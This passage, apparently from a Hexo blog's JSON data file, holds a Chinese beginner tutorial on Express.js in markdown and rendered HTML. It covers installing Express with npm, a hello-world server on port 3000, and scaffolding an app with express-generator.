no test specified\\\" && exit 1\"\n  },\n  \"keywords\": [\n    \"express\"\n  ],\n  \"author\": \"yvshare.cn\",\n  \"license\": \"ISC\"\n}\n```\n\n> 在当前目录中安装`Express`，然后将其保存在依赖项列表中。例如：\n\n```sh\n$ npm install express --save\n```\n要暂时安装`Express`而不将其添加到依赖项列表中，请省略`--save`选项：\n```sh\n$ npm install express\n```\n`采用 --save 选项安装的 Node 模块已添加到 package.json 文件中的 dependencies 列表。 今后运行 app 目录中的 npm install 将自动安装依赖项列表中的模块。`\n\n- <a name=\"hello\">1.2 hello world</a>\n\n> 在<a href=\"#install\">1.1</a>步骤的基础上，开始创建第一个程序，创建一个`app.js`文件（对应`npm init`时的`entry point: (app.js)`），并填入代码：\n\n```js\n// app.js\nvar express = require('express');\nvar app = express();\n\napp.get('/', function (req, res) {\n  res.send('Hello World!');\n});\n\napp.listen(3000, function () {\n  console.log('Example app listening on port 3000!');\n});\n```\n应用程序会启动服务器，并在端口 3000 上侦听连接。此应用程序以“Hello World!”响应针对根 URL (/) 或路由的请求。对于其他所有路径，它将以 404 Not Found 进行响应。\n`req（请求）和 res（响应）与 Node 提供的对象完全相同，所以您可以在不涉及 Express 的情况下调用 req.pipe()、req.on('data', callback) 和要执行的其他任何函数。`\n\n> 使用以下命令运行应用程序：\n\n```sh\n$ node app.js\n```\n然后，在浏览器中输入 [http://localhost:3000/](http://localhost:3000/) 以查看输出。\n\n- <a name=\"generator\">1.3 Express生成器</a>\n\n`Express 生成器的作用就像是为完整的应用程序建立一个“脚手架”，包含各种用途的 JavaScript 文件、Jade 模板和子目录。`\n\n> 使用以下命令安装 express：\n\n```sh\n$ npm install express-generator -g\n```\n\n> 使用 -h 选项显示命令选项：\n\n```sh\n$ express -h\n\n  Usage: express [options] [dir]\n\n\n  Options:\n\n        --version        output the version number\n    -e, --ejs            add ejs engine support\n        --pug            add pug engine support\n        --hbs            add handlebars engine support\n    -H, --hogan          add hogan.js engine support\n    -v, --view <engine>  add view <engine> support (dust|ejs|hbs|hjs|jade|pug|twig|vash) (defaults to jade                                                                                                                                   )\n    -c, --css <engine>   add stylesheet <engine> support (less|stylus|compass|sass) (defaults to plain css                                                                                                                                   )\n        --git            add .gitignore\n    -f, --force          force on non-empty directory\n    -h, --help           output usage information\n```\n\n> 例如，以下语句在当前工作目录中创建名为 `myapp` 的 `Express` 应用程序：\n\n```sh\n$ express --view=pug myapp\n\n   create : myapp\n   create : myapp/package.json\n   create : myapp/app.js\n   create : myapp/views\n   create : myapp/views/index.pug\n   create : myapp/views/layout.pug\n   create : myapp/views/error.pug\n   create : myapp/public\n   create : myapp/routes\n   create : myapp/routes/index.js\n   create : myapp/routes/users.js\n   create : myapp/bin\n   create : myapp/bin/www\n   create : myapp/public/images\n   create : myapp/public/stylesheets\n   create : myapp/public/stylesheets/style.css\n\n   install dependencies:\n     $ cd myapp && npm install\n\n   run the app:\n     $ DEBUG=myapp:* npm start\n\n   create : myapp/public/javascripts\n```\n\n> 进入到 `myapp` 目录，然后安装依赖项：\n\n```sh\n$ npm install\n```\n\n> 在 MacOS 或 Linux 上，采用以下命令运行此应用程序：\n\n```sh\n$ DEBUG=myapp:* npm start\n```\n\n> 在 Windows 上，使用以下命令：\n\n```sh\nset DEBUG=myapp:* & npm start\n```\n或者直接\n```sh\n$ npm start\n```\n\n*然后在浏览器中输入 [http://localhost:3000/](http://localhost:3000/) 以访问此应用程序。*\n\n> 生成的应用程序具有以下目录结构：\n\n```sh\n.\n├── app.js\n├── bin\n│   └── www\n├── package.json\n├── public\n│   ├── images\n│   ├── javascripts\n│   └── stylesheets\n│       └── style.css\n├── routes\n│   ├── index.js\n│   └── users.js\n└── views\n    ├── error.pug\n    ├── index.pug\n    └── layout.pug\n\n7 directories, 9 files\n```\n`生成器创建的应用程序结构只是构造 Express 应用程序的众多方法之一。请随意使用此结构或者对其进行修改以最大程度满足自己的需求。`\n\n- <a name=\"basicrouter\">1.4 基本路由</a>\n- <a name=\"static\">1.5 静态文件处理</a>","source":"_posts/0809010_Express.js-入门.md","raw":"---\nid: 0809010\ntitle: Express.js 入门\ndate: 2018-01-12 16:07:06\ntags:\n    - Node.js\n    - Express\n    - ing\ncategories:\n---\n\n> Express: Fast, unopinionated, minimalist web framework for Node.js（Express是一个快速，高度包容，极简的Node.js框架）。事实上，只要对Node.js稍有了解，基本上就可以入门Express了，本人就是对Node.js有些了解之后就去学习了一下Express，自身感觉正如官方介绍那样。\n\n- <a href=\"#start\">1 入门</a>\n    - <a href=\"#install\">1.1 安装</a>\n    - <a href=\"#hello\">1.2 hello world</a>\n    - <a href=\"#generator\">1.3 Express生成器</a>\n    - <a href=\"#basicrouter\">1.4 基本路由</a>\n    - <a href=\"#static\">1.5 静态文件处理</a>\n- <a href=\"#guide\">2 指南</a>\n    - <a href=\"#router\">2.1 路由</a>\n    - <a href=\"#writingmiddleware\">2.2 编写中间件</a> \n    - <a href=\"#useingmiddleware\">2.3 使用中间件</a> \n- <a href=\"#api\">3 API</a>\n---\n\n#### <a name=\"start\">1. 入门</a>\n\n- <a name=\"install\">1.1 安装</a>\n\n`使用Express之前确保你的机器上安装有Node.js环境。`\n\n> 创建工程目录，并进入到工程目录：\n\n```sh\n$ mkdir express\n$ cd express\n```\n\n> 使用`npm init`命令为应用程序创建`package.json`文件：\n\n```sh\n$ npm init\n```\n输入`npm init`命令时，除了`entry point: (index.js)`选项修改`index.js`为`app.js`（入口文件）之外（当然也可以使用默认值），其余的选项可以直接回车选择默认值。\n此时，工程中会生成一个`package.json`文件，打开看一下，基本长这样：\n```json\n{\n  \"name\": \"express\",\n  \"version\": \"1.0.0\",\n  \"description\": \"start express\",\n  \"main\": \"app.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n  \"keywords\": [\n    \"express\"\n  ],\n  \"author\": \"yvshare.cn\",\n  \"license\": \"ISC\"\n}\n```\n\n> 在当前目录中安装`Express`，然后将其保存在依赖项列表中。例如：\n\n```sh\n$ npm install express --save\n```\n要暂时安装`Express`而不将其添加到依赖项列表中，请省略`--save`选项：\n```sh\n$ npm install express\n```\n`采用 --save 选项安装的 Node 模块已添加到 package.json 文件中的 dependencies 列表。 今后运行 app 目录中的 npm install 将自动安装依赖项列表中的模块。`\n\n- <a name=\"hello\">1.2 hello world</a>\n\n> 在<a href=\"#install\">1.1</a>步骤的基础上，开始创建第一个程序，创建一个`app.js`文件（对应`npm init`时的`entry point: (app.js)`），并填入代码：\n\n```js\n// app.js\nvar express = require('express');\nvar app = express();\n\napp.get('/', function (req, res) {\n  res.send('Hello World!');\n});\n\napp.listen(3000, function () {\n  console.log('Example app listening on port 3000!');\n});\n```\n应用程序会启动服务器，并在端口 3000 上侦听连接。此应用程序以“Hello World!”响应针对根 URL (/) 或路由的请求。对于其他所有路径，它将以 404 Not Found 进行响应。\n`req（请求）和 res（响应）与 Node 提供的对象完全相同，所以您可以在不涉及 Express 的情况下调用 req.pipe()、req.on('data', callback) 和要执行的其他任何函数。`\n\n> 使用以下命令运行应用程序：\n\n```sh\n$ node app.js\n```\n然后，在浏览器中输入 [http://localhost:3000/](http://localhost:3000/) 以查看输出。\n\n- <a name=\"generator\">1.3 Express生成器</a>\n\n`Express 生成器的作用就像是为完整的应用程序建立一个“脚手架”，包含各种用途的 JavaScript 文件、Jade 模板和子目录。`\n\n> 使用以下命令安装 express：\n\n```sh\n$ npm install express-generator -g\n```\n\n> 使用 -h 选项显示命令选项：\n\n```sh\n$ express -h\n\n  Usage: express [options] [dir]\n\n\n  Options:\n\n        --version        output the version number\n    -e, --ejs            add ejs engine support\n        --pug            add pug engine support\n        --hbs            add handlebars engine support\n    -H, --hogan          add hogan.js engine support\n    -v, --view <engine>  add view <engine> support (dust|ejs|hbs|hjs|jade|pug|twig|vash) (defaults to jade                                                                                                                                   )\n    -c, --css <engine>   add stylesheet <engine> support (less|stylus|compass|sass) (defaults to plain css                                                                                                                                   )\n        --git            add .gitignore\n    -f, --force          force on non-empty directory\n    -h, --help           output usage information\n```\n\n> 例如，以下语句在当前工作目录中创建名为 `myapp` 的 `Express` 应用程序：\n\n```sh\n$ express --view=pug myapp\n\n   create : myapp\n   create : myapp/package.json\n   create : myapp/app.js\n   create : myapp/views\n   create : myapp/views/index.pug\n   create : myapp/views/layout.pug\n   create : myapp/views/error.pug\n   create : myapp/public\n   create : myapp/routes\n   create : myapp/routes/index.js\n   create : myapp/routes/users.js\n   create : myapp/bin\n   create : myapp/bin/www\n   create : myapp/public/images\n   create : myapp/public/stylesheets\n   create : myapp/public/stylesheets/style.css\n\n   install dependencies:\n     $ cd myapp && npm install\n\n   run the app:\n     $ DEBUG=myapp:* npm start\n\n   create : myapp/public/javascripts\n```\n\n> 进入到 `myapp` 目录，然后安装依赖项：\n\n```sh\n$ npm install\n```\n\n> 在 MacOS 或 Linux 上，采用以下命令运行此应用程序：\n\n```sh\n$ DEBUG=myapp:* npm start\n```\n\n> 在 Windows 上，使用以下命令：\n\n```sh\nset DEBUG=myapp:* & npm start\n```\n或者直接\n```sh\n$ npm start\n```\n\n*然后在浏览器中输入 [http://localhost:3000/](http://localhost:3000/) 以访问此应用程序。*\n\n> 生成的应用程序具有以下目录结构：\n\n```sh\n.\n├── app.js\n├── bin\n│   └── www\n├── package.json\n├── public\n│   ├── images\n│   ├── javascripts\n│   └── stylesheets\n│       └── style.css\n├── routes\n│   ├── index.js\n│   └── users.js\n└── views\n    ├── error.pug\n    ├── index.pug\n    └── layout.pug\n\n7 directories, 9 files\n```\n`生成器创建的应用程序结构只是构造 Express 应用程序的众多方法之一。请随意使用此结构或者对其进行修改以最大程度满足自己的需求。`\n\n- <a name=\"basicrouter\">1.4 基本路由</a>\n- <a name=\"static\">1.5 静态文件处理</a>","slug":"0809010_Express.js-入门","published":1,"updated":"2018-03-26T12:16:44.387Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvw2002js4c0zwzo789i","content":"<blockquote>\n<p>Express: Fast, unopinionated, minimalist web framework for Node.js（Express是一个快速，高度包容，极简的Node.js框架）。事实上，只要对Node.js稍有了解，基本上就可以入门Express了，本人就是对Node.js有些了解之后就去学习了一下Express，自身感觉正如官方介绍那样。</p>\n</blockquote>\n<ul>\n<li><a href=\"#start\">1 入门</a><ul>\n<li><a href=\"#install\">1.1 安装</a></li>\n<li><a href=\"#hello\">1.2 hello world</a></li>\n<li><a href=\"#generator\">1.3 Express生成器</a></li>\n<li><a href=\"#basicrouter\">1.4 基本路由</a></li>\n<li><a href=\"#static\">1.5 静态文件处理</a></li>\n</ul>\n</li>\n<li><a href=\"#guide\">2 指南</a><ul>\n<li><a href=\"#router\">2.1 路由</a></li>\n<li><a href=\"#writingmiddleware\">2.2 编写中间件</a> </li>\n<li><a href=\"#useingmiddleware\">2.3 使用中间件</a> </li>\n</ul>\n</li>\n<li><a href=\"#api\">3 API</a></li>\n</ul>\n<hr>\n<h4 id=\"1-入门\"><a href=\"#1-入门\" class=\"headerlink\" title=\"1. 入门\"></a><a name=\"start\">1. 入门</a></h4><ul>\n<li><a name=\"install\">1.1 安装</a></li>\n</ul>\n<p><code>使用Express之前确保你的机器上安装有Node.js环境。</code></p>\n<blockquote>\n<p>创建工程目录，并进入到工程目录：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ mkdir express</span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> express</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>使用<code>npm init</code>命令为应用程序创建<code>package.json</code>文件：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm init</span><br></pre></td></tr></table></figure>\n<p>输入<code>npm init</code>命令时，除了<code>entry point: (index.js)</code>选项修改<code>index.js</code>为<code>app.js</code>（入口文件）之外（当然也可以使用默认值），其余的选项可以直接回车选择默认值。<br>此时，工程中会生成一个<code>package.json</code>文件，打开看一下，基本长这样：<br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"express\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"1.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"start express\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"main\"</span>: <span class=\"string\">\"app.js\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"scripts\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"test\"</span>: <span class=\"string\">\"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">\"keywords\"</span>: [</span><br><span class=\"line\">    <span class=\"string\">\"express\"</span></span><br><span class=\"line\">  ],</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"yvshare.cn\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"license\"</span>: <span class=\"string\">\"ISC\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>在当前目录中安装<code>Express</code>，然后将其保存在依赖项列表中。例如：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install express --save</span><br></pre></td></tr></table></figure>\n<p>要暂时安装<code>Express</code>而不将其添加到依赖项列表中，请省略<code>--save</code>选项：<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install express</span><br></pre></td></tr></table></figure></p>\n<p><code>采用 --save 选项安装的 Node 模块已添加到 package.json 文件中的 dependencies 列表。 今后运行 app 目录中的 npm install 将自动安装依赖项列表中的模块。</code></p>\n<ul>\n<li><a name=\"hello\">1.2 hello world</a></li>\n</ul>\n<blockquote>\n<p>在<a href=\"#install\">1.1</a>步骤的基础上，开始创建第一个程序，创建一个<code>app.js</code>文件（对应<code>npm init</code>时的<code>entry point: (app.js)</code>），并填入代码：</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// app.js</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">'express'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> app = express();</span><br><span class=\"line\"></span><br><span class=\"line\">app.get(<span class=\"string\">'/'</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">req, res</span>) </span>&#123;</span><br><span class=\"line\">  res.send(<span class=\"string\">'Hello World!'</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.listen(<span class=\"number\">3000</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(<span class=\"string\">'Example app listening on port 3000!'</span>);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>应用程序会启动服务器，并在端口 3000 上侦听连接。此应用程序以“Hello World!”响应针对根 URL (/) 或路由的请求。对于其他所有路径，它将以 404 Not Found 进行响应。<br><code>req（请求）和 res（响应）与 Node 提供的对象完全相同，所以您可以在不涉及 Express 的情况下调用 req.pipe()、req.on(&#39;data&#39;, callback) 和要执行的其他任何函数。</code></p>\n<blockquote>\n<p>使用以下命令运行应用程序：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ node app.js</span><br></pre></td></tr></table></figure>\n<p>然后，在浏览器中输入 <a href=\"http://localhost:3000/\" target=\"_blank\" rel=\"noopener\">http://localhost:3000/</a> 以查看输出。</p>\n<ul>\n<li><a name=\"generator\">1.3 Express生成器</a></li>\n</ul>\n<p><code>Express 生成器的作用就像是为完整的应用程序建立一个“脚手架”，包含各种用途的 JavaScript 文件、Jade 模板和子目录。</code></p>\n<blockquote>\n<p>使用以下命令安装 express：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install express-generator -g</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>使用 -h 选项显示命令选项：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ express -h</span><br><span class=\"line\"></span><br><span class=\"line\">  Usage: express [options] [dir]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  Options:</span><br><span class=\"line\"></span><br><span class=\"line\">        --version        output the version number</span><br><span class=\"line\">    -e, --ejs            add ejs engine support</span><br><span class=\"line\">        --pug            add pug engine support</span><br><span class=\"line\">        --hbs            add handlebars engine support</span><br><span class=\"line\">    -H, --hogan          add hogan.js engine support</span><br><span class=\"line\">    -v, --view &lt;engine&gt;  add view &lt;engine&gt; support (dust|ejs|hbs|hjs|jade|pug|twig|vash) (defaults to jade                                                                                                                                   )</span><br><span class=\"line\">    -c, --css &lt;engine&gt;   add stylesheet &lt;engine&gt; support (less|stylus|compass|sass) (defaults to plain css                                                                                                                                   )</span><br><span class=\"line\">        --git            add .gitignore</span><br><span class=\"line\">    -f, --force          force on non-empty directory</span><br><span class=\"line\">    -h, --<span class=\"built_in\">help</span>           output usage information</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>例如，以下语句在当前工作目录中创建名为 <code>myapp</code> 的 <code>Express</code> 应用程序：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ express --view=pug myapp</span><br><span class=\"line\"></span><br><span class=\"line\">   create : myapp</span><br><span class=\"line\">   create : myapp/package.json</span><br><span class=\"line\">   create : myapp/app.js</span><br><span class=\"line\">   create : myapp/views</span><br><span class=\"line\">   create : myapp/views/index.pug</span><br><span class=\"line\">   create : myapp/views/layout.pug</span><br><span class=\"line\">   create : myapp/views/error.pug</span><br><span class=\"line\">   create : myapp/public</span><br><span class=\"line\">   create : myapp/routes</span><br><span class=\"line\">   create : myapp/routes/index.js</span><br><span class=\"line\">   create : myapp/routes/users.js</span><br><span class=\"line\">   create : myapp/bin</span><br><span class=\"line\">   create : myapp/bin/www</span><br><span class=\"line\">   create : myapp/public/images</span><br><span class=\"line\">   create : myapp/public/stylesheets</span><br><span class=\"line\">   create : myapp/public/stylesheets/style.css</span><br><span class=\"line\"></span><br><span class=\"line\">   install dependencies:</span><br><span class=\"line\">     $ <span class=\"built_in\">cd</span> myapp &amp;&amp; npm install</span><br><span class=\"line\"></span><br><span class=\"line\">   run the app:</span><br><span class=\"line\">     $ DEBUG=myapp:* npm start</span><br><span class=\"line\"></span><br><span class=\"line\">   create : myapp/public/javascripts</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>进入到 <code>myapp</code> 目录，然后安装依赖项：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>在 MacOS 或 Linux 上，采用以下命令运行此应用程序：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ DEBUG=myapp:* npm start</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>在 Windows 上，使用以下命令：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">set</span> DEBUG=myapp:* &amp; npm start</span><br></pre></td></tr></table></figure>\n<p>或者直接<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm start</span><br></pre></td></tr></table></figure></p>\n<p><em>然后在浏览器中输入 <a href=\"http://localhost:3000/\" target=\"_blank\" rel=\"noopener\">http://localhost:3000/</a> 以访问此应用程序。</em></p>\n<blockquote>\n<p>生成的应用程序具有以下目录结构：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.</span><br><span class=\"line\">├── app.js</span><br><span class=\"line\">├── bin</span><br><span class=\"line\">│   └── www</span><br><span class=\"line\">├── package.json</span><br><span class=\"line\">├── public</span><br><span class=\"line\">│   ├── images</span><br><span class=\"line\">│   ├── javascripts</span><br><span class=\"line\">│   └── stylesheets</span><br><span class=\"line\">│       └── style.css</span><br><span class=\"line\">├── routes</span><br><span class=\"line\">│   ├── index.js</span><br><span class=\"line\">│   └── users.js</span><br><span class=\"line\">└── views</span><br><span class=\"line\">    ├── error.pug</span><br><span class=\"line\">    ├── index.pug</span><br><span class=\"line\">    └── layout.pug</span><br><span class=\"line\"></span><br><span class=\"line\">7 directories, 9 files</span><br></pre></td></tr></table></figure>\n<p><code>生成器创建的应用程序结构只是构造 Express 应用程序的众多方法之一。请随意使用此结构或者对其进行修改以最大程度满足自己的需求。</code></p>\n<ul>\n<li><a name=\"basicrouter\">1.4 基本路由</a></li>\n<li><a name=\"static\">1.5 静态文件处理</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>Express: Fast, unopinionated, minimalist web framework for Node.js（Express是一个快速，高度包容，极简的Node.js框架）。事实上，只要对Node.js稍有了解，基本上就可以入门Express了，本人就是对Node.js有些了解之后就去学习了一下Express，自身感觉正如官方介绍那样。</p>\n</blockquote>\n<ul>\n<li><a href=\"#start\">1 入门</a><ul>\n<li><a href=\"#install\">1.1 安装</a></li>\n<li><a href=\"#hello\">1.2 hello world</a></li>\n<li><a href=\"#generator\">1.3 Express生成器</a></li>\n<li><a href=\"#basicrouter\">1.4 基本路由</a></li>\n<li><a href=\"#static\">1.5 静态文件处理</a></li>\n</ul>\n</li>\n<li><a href=\"#guide\">2 指南</a><ul>\n<li><a href=\"#router\">2.1 路由</a></li>\n<li><a href=\"#writingmiddleware\">2.2 编写中间件</a> </li>\n<li><a href=\"#useingmiddleware\">2.3 使用中间件</a> </li>\n</ul>\n</li>\n<li><a href=\"#api\">3 API</a></li>\n</ul>\n<hr>\n<h4 id=\"1-入门\"><a href=\"#1-入门\" class=\"headerlink\" title=\"1. 入门\"></a><a name=\"start\">1. 入门</a></h4><ul>\n<li><a name=\"install\">1.1 安装</a></li>\n</ul>\n<p><code>使用Express之前确保你的机器上安装有Node.js环境。</code></p>\n<blockquote>\n<p>创建工程目录，并进入到工程目录：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ mkdir express</span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> express</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>使用<code>npm init</code>命令为应用程序创建<code>package.json</code>文件：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm init</span><br></pre></td></tr></table></figure>\n<p>输入<code>npm init</code>命令时，除了<code>entry point: (index.js)</code>选项修改<code>index.js</code>为<code>app.js</code>（入口文件）之外（当然也可以使用默认值），其余的选项可以直接回车选择默认值。<br>此时，工程中会生成一个<code>package.json</code>文件，打开看一下，基本长这样：<br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"express\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"1.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"start express\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"main\"</span>: <span class=\"string\">\"app.js\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"scripts\"</span>: &#123;</span><br><span class=\"line\">    <span class=\"attr\">\"test\"</span>: <span class=\"string\">\"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\"</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">\"keywords\"</span>: [</span><br><span class=\"line\">    <span class=\"string\">\"express\"</span></span><br><span class=\"line\">  ],</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"yvshare.cn\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"license\"</span>: <span class=\"string\">\"ISC\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>在当前目录中安装<code>Express</code>，然后将其保存在依赖项列表中。例如：</p>\n</blockquote>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install express --save</span><br></pre></td></tr></table></figure>\n<p>要暂时安装<code>Express</code>而不将其添加到依赖项列表中，请省略<code>--save</code>选项：<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install express</span><br></pre></td></tr></table></figure></p>\n<p><code>采用 --save 选项安装的 Node 模块已添加到 package.json 文件中的 dependencies 列表。 今后运行 app 目录中的 npm install 将自动安装依赖项列表中的模块。</code></p>\n<ul>\n<li><a name=\"hello\">1.2 hello world</a></li>\n</ul>\n<blockquote>\n<p>在<a href=\"#install\">1.1</a>步骤的基础上，开始创建第一个程序，创建一个<code>app.js</code>文件（对应<code>npm init</code>时的<code>entry point: (app.js)</code>），并填入代码：</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span 